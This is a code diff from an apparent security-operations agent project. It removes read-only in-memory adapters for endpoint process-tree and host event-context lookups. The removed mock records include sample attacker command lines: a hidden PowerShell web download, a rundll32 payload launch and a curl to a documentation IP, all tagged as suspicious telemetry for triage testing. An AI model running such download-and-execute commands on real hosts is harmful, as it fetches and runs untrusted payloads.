@@ -12,8 +12,6 @@ from soc_agent.contracts import (
     SocAgentActionResult,
     SocAgentRiskLevel,
     SocAssetLookupRecord,
-    SocEndpointProcessTreeRecord,
-    SocHostEventContextRecord,
     SocSecurityTagRecord,
     SocThreatIntelReputationRecord,
 )
@@ -205,8 +203,6 @@ class DryRunOnlySocActionAdapter:
 
 
 ASSET_LOOKUP_ACTION = "asset.lookup"
-ENDPOINT_PROCESS_TREE_LOOKUP_ACTION = "endpoint.process_tree.lookup"
-HOST_EVENT_CONTEXT_LOOKUP_ACTION = "host.event_context.lookup"
 THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION = "threat_intel.ip_reputation.lookup"
 SECURITY_TAG_LOOKUP_ACTION = "security_tag.lookup"
 
@@ -312,207 +308,6 @@ class InMemoryAssetLookupActionAdapter:
             payload=_asset_lookup_payload(
                 descriptor=self.descriptor,
                 asset_key=asset_key,
-                record=record,
-                context=context,
-            ),
-        )
-
-
-def endpoint_process_tree_lookup_adapter_descriptor(
-    *,
-    adapter_id: str = "endpoint-process-tree-in-memory",
-) -> SocAgentActionAdapterDescriptor:
-    """Descriptor for a read-only endpoint process-tree lookup adapter."""
-
-    return SocAgentActionAdapterDescriptor(
-        adapter_id=adapter_id,
-        route=ENDPOINT_PROCESS_TREE_LOOKUP_ACTION,
-        action=ENDPOINT_PROCESS_TREE_LOOKUP_ACTION,
-        risk_level=SocAgentRiskLevel.READ_ONLY,
-        adapter_kind="service",
-        external_side_effect="read",
-        dry_run_supported=True,
-        execute_supported=True,
-        idempotency_required=False,
-        required_payload_fields=["host_key"],
-        description="Read-only endpoint process-tree lookup adapter.",
-    )
-
-
-class InMemoryEndpointProcessTreeLookupActionAdapter:
-    """Read-only endpoint process-tree lookup backed by in-memory records."""
-
-    def __init__(
-        self,
-        records: Iterable[SocEndpointProcessTreeRecord | Mapping[str, Any]] | None = None,
-        *,
-        descriptor: SocAgentActionAdapterDescriptor | None = None,
-    ) -> None:
-        self.descriptor = descriptor or endpoint_process_tree_lookup_adapter_descriptor()
-        if self.descriptor.action != ENDPOINT_PROCESS_TREE_LOOKUP_ACTION or self.descriptor.route != ENDPOINT_PROCESS_TREE_LOOKUP_ACTION:
-            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter requires route/action endpoint.process_tree.lookup")
-        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
-            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter must be read-only")
-        if self.descriptor.external_side_effect != "read":
-            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter must declare external_side_effect=read")
-        self._records = _index_process_tree_records(records or _default_process_tree_records())
-
-    def dry_run(
-        self,
-        command: SocAgentActionCommand,
-        *,
-        context: ServiceRequestContext,
-    ) -> SocAgentActionResult:
-        if not command.dry_run:
-            raise SocActionAdapterRegistryError("endpoint.process_tree.lookup dry-run requires command.dry_run=true")
-        _validate_command_matches_descriptor(command, self.descriptor)
-        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
-        host_key = _host_key_from_payload(command.payload)
-        return SocAgentActionResult(
-            route=command.route,
-            action=command.action,
-            status="success",
-            message="Endpoint process-tree lookup dry-run validated; no EDR read executed.",
-            payload={
-                "adapter_id": self.descriptor.adapter_id,
-                "adapter_kind": self.descriptor.adapter_kind,
-                "dry_run": True,
-                "host_key": host_key,
-                "process_tree_found": None,
-                "external_side_effect": "not_executed",
-                "read_only": True,
-                "executed_by": context.actor.model_dump(mode="json"),
-                "idempotency_key": context.idempotency_key,
-            },
-        )
-
-    def execute(
-        self,
-        command: SocAgentActionCommand,
-        *,
-        context: ServiceRequestContext,
-    ) -> SocAgentActionResult:
-        if command.dry_run:
-            raise SocActionAdapterRegistryError("endpoint.process_tree.lookup execute requires command.dry_run=false")
-        _validate_command_matches_descriptor(command, self.descriptor)
-        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
-        host_key = _host_key_from_payload(command.payload)
-        record = self._records.get(_normalize_asset_key(host_key))
-        if record is None:
-            return SocAgentActionResult(
-                route=command.route,
-                action=command.action,
-                status="success",
-                message=f"Endpoint process-tree lookup completed; no process tree matched {host_key}.",
-                payload=_process_tree_lookup_payload(
-                    descriptor=self.descriptor,
-                    host_key=host_key,
-                    record=None,
-                    context=context,
-                ),
-            )
-        return SocAgentActionResult(
-            route=command.route,
-            action=command.action,
-            status="success",
-            message=f"Endpoint process-tree lookup completed for {host_key}.",
-            payload=_process_tree_lookup_payload(
-                descriptor=self.descriptor,
-                host_key=host_key,
-                record=record,
-                context=context,
-            ),
-        )
-
-
-def host_event_context_lookup_adapter_descriptor(
-    *,
-    adapter_id: str = "host-event-context-in-memory",
-) -> SocAgentActionAdapterDescriptor:
-    """Descriptor for a read-only host event-context lookup adapter."""
-
-    return SocAgentActionAdapterDescriptor(
-        adapter_id=adapter_id,
-        route=HOST_EVENT_CONTEXT_LOOKUP_ACTION,
-        action=HOST_EVENT_CONTEXT_LOOKUP_ACTION,
-        risk_level=SocAgentRiskLevel.READ_ONLY,
-        adapter_kind="service",
-        external_side_effect="read",
-        dry_run_supported=True,
-        execute_supported=True,
-        idempotency_required=False,
-        required_payload_fields=["host_key"],
-        description="Read-only host event-context lookup adapter.",
-    )
-
-
-class InMemoryHostEventContextLookupActionAdapter:
-    """Read-only host event-context lookup backed by in-memory records."""
-
-    def __init__(
-        self,
-        records: Iterable[SocHostEventContextRecord | Mapping[str, Any]] | None = None,
-        *,
-        descriptor: SocAgentActionAdapterDescriptor | None = None,
-    ) -> None:
-        self.descriptor = descriptor or host_event_context_lookup_adapter_descriptor()
-        if self.descriptor.action != HOST_EVENT_CONTEXT_LOOKUP_ACTION or self.descriptor.route != HOST_EVENT_CONTEXT_LOOKUP_ACTION:
-            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter requires route/action host.event_context.lookup")
-        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
-            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter must be read-only")
-        if self.descriptor.external_side_effect != "read":
-            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter must declare external_side_effect=read")
-        self._records = _index_host_event_context_records(records or _default_host_event_context_records())
-
-    def dry_run(
-        self,
-        command: SocAgentActionCommand,
-        *,
-        context: ServiceRequestContext,
-    ) -> SocAgentActionResult:
-        if not command.dry_run:
-            raise SocActionAdapterRegistryError("host.event_context.lookup dry-run requires command.dry_run=true")
-        _validate_command_matches_descriptor(command, self.descriptor)
-        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
-        host_key = _host_key_from_payload(command.payload, action=HOST_EVENT_CONTEXT_LOOKUP_ACTION)
-        return SocAgentActionResult(
-            route=command.route,
-            action=command.action,
-            status="success",
-            message="Host event-context lookup dry-run validated; no host telemetry read executed.",
-            payload={
-                "adapter_id": self.descriptor.adapter_id,
-                "adapter_kind": self.descriptor.adapter_kind,
-                "dry_run": True,
-                "host_key": host_key,
-                "host_event_context_found": None,
-                "external_side_effect": "not_executed",
-                "read_only": True,
-                "executed_by": context.actor.model_dump(mode="json"),
-                "idempotency_key": context.idempotency_key,
-            },
-        )
-
-    def execute(
-        self,
-        command: SocAgentActionCommand,
-        *,
-        context: ServiceRequestContext,
-    ) -> SocAgentActionResult:
-        if command.dry_run:
-            raise SocActionAdapterRegistryError("host.event_context.lookup execute requires command.dry_run=false")
-        _validate_command_matches_descriptor(command, self.descriptor)
-        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
-        host_key = _host_key_from_payload(command.payload, action=HOST_EVENT_CONTEXT_LOOKUP_ACTION)
-        record = self._records.get(_normalize_asset_key(host_key))
-        return SocAgentActionResult(
-            route=command.route,
-            action=command.action,
-            status="success",
-            message=(f"Host event-context lookup completed for {host_key}." if record is not None else f"Host event-context lookup completed; no host context matched {host_key}."),
-            payload=_host_event_context_lookup_payload(
-                descriptor=self.descriptor,
-                host_key=host_key,
                 record=record,
                 context=context,
             ),
@@ -745,26 +540,6 @@ def _index_asset_records(records: Iterable[SocAssetLookupRecord | Mapping[str, A
     return index
 
 
-def _index_process_tree_records(records: Iterable[SocEndpointProcessTreeRecord | Mapping[str, Any]]) -> dict[str, SocEndpointProcessTreeRecord]:
-    index: dict[str, SocEndpointProcessTreeRecord] = {}
-    for item in records:
-        record = item if isinstance(item, SocEndpointProcessTreeRecord) else SocEndpointProcessTreeRecord.model_validate(item)
-        for key in (record.host_key, record.hostname, record.primary_ip):
-            if key:
-                index[_normalize_asset_key(key)] = record
-    return index
-
-
-def _index_host_event_context_records(records: Iterable[SocHostEventContextRecord | Mapping[str, Any]]) -> dict[str, SocHostEventContextRecord]:
-    index: dict[str, SocHostEventContextRecord] = {}
-    for item in records:
-        record = item if isinstance(item, SocHostEventContextRecord) else SocHostEventContextRecord.model_validate(item)
-        for key in (record.host_key, record.hostname, record.primary_ip):
-            if key:
-                index[_normalize_asset_key(key)] = record
-    return index
-
-
 def _index_threat_intel_records(records: Iterable[SocThreatIntelReputationRecord | Mapping[str, Any]]) -> dict[str, SocThreatIntelReputationRecord]:
     index: dict[str, SocThreatIntelReputationRecord] = {}
     for item in records:
@@ -785,13 +560,6 @@ def _asset_key_from_payload(payload: Mapping[str, Any]) -> str:
     value = payload.get("asset_key")
     if not isinstance(value, str) or not value.strip():
         raise SocActionAdapterRegistryError("asset.lookup requires non-empty payload asset_key")
-    return value.strip()
-
-
-def _host_key_from_payload(payload: Mapping[str, Any], *, action: str = ENDPOINT_PROCESS_TREE_LOOKUP_ACTION) -> str:
-    value = payload.get("host_key")
-    if not isinstance(value, str) or not value.strip():
-        raise SocActionAdapterRegistryError(f"{action} requires non-empty payload host_key")
     return value.strip()
 
 
@@ -833,50 +601,6 @@ def _asset_lookup_payload(
         "idempotency_key": context.idempotency_key,
     }
     return payload
-
-
-def _process_tree_lookup_payload(
-    *,
-    descriptor: SocAgentActionAdapterDescriptor,
-    host_key: str,
-    record: SocEndpointProcessTreeRecord | None,
-    context: ServiceRequestContext,
-) -> dict[str, Any]:
-    return {
-        "adapter_id": descriptor.adapter_id,
-        "adapter_kind": descriptor.adapter_kind,
-        "dry_run": False,
-        "host_key": host_key,
-        "process_tree_found": record is not None,
-        "process_tree": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
-        "external_side_effect": "read",
-        "read_only": True,
-        "mocked": record.mocked if record is not None else True,
-        "executed_by": context.actor.model_dump(mode="json"),
-        "idempotency_key": context.idempotency_key,
-    }
-
-
-def _host_event_context_lookup_payload(
-    *,
-    descriptor: SocAgentActionAdapterDescriptor,
-    host_key: str,
-    record: SocHostEventContextRecord | None,
-    context: ServiceRequestContext,
-) -> dict[str, Any]:
-    return {
-        "adapter_id": descriptor.adapter_id,
-        "adapter_kind": descriptor.adapter_kind,
-        "dry_run": False,
-        "host_key": host_key,
-        "host_event_context_found": record is not None,
-        "host_event_context": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
-        "external_side_effect": "read",
-        "read_only": True,
-        "mocked": record.mocked if record is not None else True,
-        "executed_by": context.actor.model_dump(mode="json"),
-        "idempotency_key": context.idempotency_key,
-    }
 
 
 def _threat_intel_lookup_payload(
@@ -924,82 +648,6 @@ def _security_tag_lookup_payload(
     }
 
 
-def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
-    return [
-        SocEndpointProcessTreeRecord(
-            host_key="endpoint-1",
-            hostname="endpoint-1",
-            primary_ip="10.10.1.5",
-            process_tree_id="ptree-mock-001",
-            processes=[
-                {
-                    "pid": 4200,
-                    "parent_pid": 700,
-                    "process_name": "powershell.exe",
-                    "command_line": "powershell.exe -nop -w hidden Invoke-WebRequest http://203.0.113.10/a",
-                    "user": "enterprise-user-1",
-                    "risk_tags": ["suspicious_powershell", "network_download"],
-                },
-                {
-                    "pid": 4488,
-                    "parent_pid": 4200,
-                    "process_name": "rundll32.exe",
-                    "command_line": "rundll32.exe C:\\Users\\Public\\payload.dll,Start",
-                    "user": "enterprise-user-1",
-                    "risk_tags": ["payload_execution"],
-                },
-            ],
-            network_connections=[
-                {
-                    "process_name": "powershell.exe",
-                    "remote_ip": "203.0.113.10",
-                    "remote_port": 80,
-                    "direction": "outbound",
-                    "protocol": "tcp",
-                }
-            ],
-            source="mock_edr_process_tree",
-            mocked=True,
-        )
-    ]
-
-
-def _default_host_event_context_records() -> list[SocHostEventContextRecord]:
-    return [
-        SocHostEventContextRecord(
-            host_key="web-01",
-            hostname="web-01",
-            primary_ip="10.10.2.15",
-            time_window="PT30M",
-            recent_logins=[
-                {
-                    "user": "enterprise-user-1",
-                    "source_ip": "10.20.0.15",
-                    "result": "success",
-                    "method": "ssh",
-                }
-            ],
-            related_commands=[
-                {
-                    "user": "enterprise-user-1",
-                    "command": "curl http://198.51.100.10/a",
-                    "process_name": "bash",
-                }
-            ],
-            source_ips=["10.20.0.15"],
-            related_events=[
-                {
-                    "event_type": "process_execution",
-                    "summary": "Shell spawned outbound HTTP request during alert window.",
-                }
-            ],
-            host_criticality="high",
-            source="mock_host_event_context",
-            mocked=True,
-        )
-    ]
-
-
 def _default_threat_intel_records() -> list[SocThreatIntelReputationRecord]:
     return [
         SocThreatIntelReputationRecord(
@@ -1031,22 +679,16 @@ def _default_security_tag_records() -> list[SocSecurityTagRecord]:
 
 __all__ = [
     "ASSET_LOOKUP_ACTION",
-    "ENDPOINT_PROCESS_TREE_LOOKUP_ACTION",
-    "HOST_EVENT_CONTEXT_LOOKUP_ACTION",
     "SECURITY_TAG_LOOKUP_ACTION",
     "THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION",
     "DryRunOnlySocActionAdapter",
     "InMemoryAssetLookupActionAdapter",
-    "InMemoryEndpointProcessTreeLookupActionAdapter",
-    "InMemoryHostEventContextLookupActionAdapter",
     "InMemorySecurityTagLookupActionAdapter",
     "InMemoryThreatIntelIpReputationLookupActionAdapter",
     "SocActionAdapterNotFoundError",
     "SocActionAdapterRegistry",
     "SocActionAdapterRegistryError",
     "asset_lookup_adapter_descriptor",
-    "endpoint_process_tree_lookup_adapter_descriptor",
-    "host_event_context_lookup_adapter_descriptor",
     "security_tag_lookup_adapter_descriptor",
     "threat_intel_ip_reputation_lookup_adapter_descriptor",
 ]
